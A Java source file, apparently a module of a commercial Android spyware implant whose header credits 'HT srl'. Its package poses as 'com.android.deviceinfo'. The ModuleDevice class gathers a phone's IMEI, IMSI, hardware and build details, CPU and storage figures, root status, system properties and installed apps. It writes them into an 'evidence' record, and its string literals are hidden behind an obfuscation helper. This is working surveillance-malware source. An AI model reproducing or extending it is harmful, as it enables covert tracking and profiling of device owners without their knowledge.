/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.deviceinfo.module;

import java.io.BufferedReader;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.List;
import java.util.Map.Entry;
import java.util.Properties;

import android.content.pm.PackageInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Environment;
import android.os.StatFs;

import com.android.deviceinfo.Device;
import com.android.deviceinfo.Status;
import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.conf.ConfModule;
import com.android.deviceinfo.evidence.EvidenceReference;
import com.android.deviceinfo.evidence.EvidenceType;
import com.android.deviceinfo.util.Check;
import com.android.deviceinfo.util.WChar;
import com.android.m.M;

/**
 * http://android.git.kernel.org/?p=platform/packages/apps/Settings.git;a=tree;f
 * =src/com/android/settings;h=1d1b538ef4728c9559da43828a7df9e9bb5c512f;hb=HEAD
 * 
 * @author zeno
 * 
 */
public class ModuleDevice extends BaseInstantModule {

	/** The Constant TAG. */
	private static final String TAG = "ModuleDevice"; //$NON-NLS-1$

	/** The process list. */
	private boolean processList = true;

	/** The cpu usage. */
	private float cpuUsage;

	/** The cpu total. */
	private long cpuTotal;

	/** The cpu idle. */
	private long cpuIdle;

	/**
	 * Instantiates a new device agent.
	 */
	public ModuleDevice() {
		if (Cfg.DEBUG) {
			Check.log(TAG + " DeviceAgent constructor");//$NON-NLS-1$
		}
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#parse(byte[])
	 */
	@Override
	public boolean parse(ConfModule conf) {
		// this.processList = true;
		return true;
	}

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
	 */
	@Override
	public void actualStart() {

		// OS Version etc...
		if (Cfg.DEBUG) {
			Check.log(TAG + " Android");//$NON-NLS-1$
		}

		final Runtime runtime = Runtime.getRuntime();
		final Properties properties = System.getProperties();
		readCpuUsage();

		final StringBuffer sb = new StringBuffer();
		if (Cfg.DEBUG) {
			sb.append("Debug\n"); //$NON-NLS-1$
			final String timestamp = System.getProperty("build.timestamp"); //$NON-NLS-1$
			if (timestamp != null) {
				sb.append(timestamp + "\n"); //$NON-NLS-1$
			}
		}

		// SYSTEM
		sb.append(M.e("-- SYSTEM --") + "\n"); //$NON-NLS-1$
		sb.append(M.e("Board: ") + Build.BOARD + "\n");
		sb.append(M.e("Brand: ") + Build.BRAND + "\n");
		sb.append(M.e("Device: ") + Build.DEVICE + "\n");
		sb.append(M.e("Display: ") + Build.MODEL + "\n");
		sb.append(M.e("Model:") + Build.DISPLAY + "\n");

		sb.append(M.e("IMEI: ") + Device.self().getImei() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		if (Device.self().getImei().length() == 0) {
			sb.append(M.e("IMSI: SIM not present") + "\n"); //$NON-NLS-1$
		} else {
			sb.append(M.e("IMSI: ") + Device.self().getImsi() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		sb.append(M.e("cpuUsage: ") + cpuUsage + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(M.e("cpuTotal: ") + cpuTotal + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		sb.append(M.e("cpuIdle: ") + cpuIdle + "\n"); //$NON-NLS-1$ //$NON-NLS-2$

		StatFs stat = new StatFs(Environment.getDataDirectory().getPath());
		long bytesAvailableInt = (long) stat.getBlockSize() * (long) stat.getBlockCount();
		sb.append("internal space: " + bytesAvailableInt + "\n");

		stat = new StatFs(Environment.getExternalStorageDirectory().getPath());
		long bytesAvailableExt = (long) stat.getBlockSize() * (long) stat.getBlockCount();

		sb.append("external state: " + Environment.getExternalStorageState() + "\n");
		sb.append("external space: " + bytesAvailableExt + "\n");

		if (Status.self().haveRoot()) {
			sb.append(M.e("root: yes") + "\n"); //$NON-NLS-1$
		} else {
			sb.append(M.e("root: no") + "\n"); //$NON-NLS-1$
		}

		sb.append(M.e("-- PROPERTIES --") + "\n"); //$NON-NLS-1$
		final Iterator<Entry<Object, Object>> it = properties.entrySet().iterator();

		while (it.hasNext()) {
			final Entry<Object, Object> pairs = it.next();
			sb.append(pairs.getKey() + " : " + pairs.getValue() + "\n"); //$NON-NLS-1$ //$NON-NLS-2$
		}

		if (processList) {
			final ArrayList<PInfo> apps = getInstalledApps(false); /*
																	 * false =
																	 * no system
																	 * packages
																	 */
			final int max = apps.size();

			for (int i = 0; i < max; i++) {
				sb.append(apps.get(i) + "\n"); //$NON-NLS-1$
			}
		}

		final String content = sb.toString();

		// log
		final EvidenceReference log = new EvidenceReference(EvidenceType.DEVICE);
		log.write(WChar.getBytes(content, true));
		log.close();

	}

	/**
	 * Read cpu usage.
	 */
	private void readCpuUsage() {
		try {
			final BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(
					M.e("/proc/stat"))), //$NON-NLS-1$
					1000);
			final String load = reader.readLine();
			reader.close();

			final String[] toks = load.split(" "); //$NON-NLS-1$

			final long currTotal = Long.parseLong(toks[2]) + Long.parseLong(toks[3]) + Long.parseLong(toks[4]);
			final long currIdle = Long.parseLong(toks[5]);

			this.cpuUsage = ((currTotal - cpuTotal) * 100.0f / (currTotal - cpuTotal + currIdle - cpuIdle));
			this.cpuTotal = currTotal;
			this.cpuIdle = currIdle;
		} catch (final IOException ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(ex);//$NON-NLS-1$
			}
		}
	}

	/**
	 * The Class PInfo.
	 */
	class PInfo {
		/** The appname. */
		private String appname = ""; //$NON-NLS-1$

		/** The pname. */
		private String pname = ""; //$NON-NLS-1$

		/** The version name. */
		private String versionName = ""; //$NON-NLS-1$

		/** The version code. */
		private int versionCode = 0;

		/*
		 * (non-Javadoc)
		 * 
		 * @see java.lang.Object#toString()
		 */
		@Override
		public String toString() {
			return appname + "\t" + pname + "\t" + versionName + "\t" + versionCode; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		}
	}

	/**
	 * Gets the packages.
	 * 
	 * @return the packages
	 */
	private ArrayList<PInfo> getPackages() {
		final ArrayList<PInfo> apps = getInstalledApps(false); /*
																 * false = no
																 * system
																 * packages
																 */
		final int max = apps.size();

		for (int i = 0; i < max; i++) {
			if (Cfg.DEBUG) {
				Check.log(TAG + " Info: " + apps.get(i).toString());//$NON-NLS-1$
			}
		}

		return apps;
	}

	/**
	 * Gets the installed apps.
	 * 
	 * @param getSysPackages
	 *            the get sys packages
	 * @return the installed apps
	 */
	private ArrayList<PInfo> getInstalledApps(final boolean getSysPackages) {
		final ArrayList<PInfo> res = new ArrayList<PInfo>();
		final PackageManager packageManager = Status.getAppContext().getPackageManager();

		final List<PackageInfo> packs = packageManager.getInstalledPackages(0);

		for (int i = 0; i < packs.size(); i++) {
			final PackageInfo p = packs.get(i);

			if ((!getSysPackages) && (p.versionName == null)) {
				continue;
			}
			
			try{
				final PInfo newInfo = new PInfo();
				newInfo.appname = p.applicationInfo.loadLabel(packageManager).toString();
				newInfo.pname = p.packageName;
				newInfo.versionName = p.versionName;
				newInfo.versionCode = p.versionCode;
				res.add(newInfo);
			}catch(Exception e){
				if (Cfg.DEBUG) {
					Check.log(TAG + " (getInstalledApps) Error: " + e);
				}
			}
		}

		return res;
	}
}
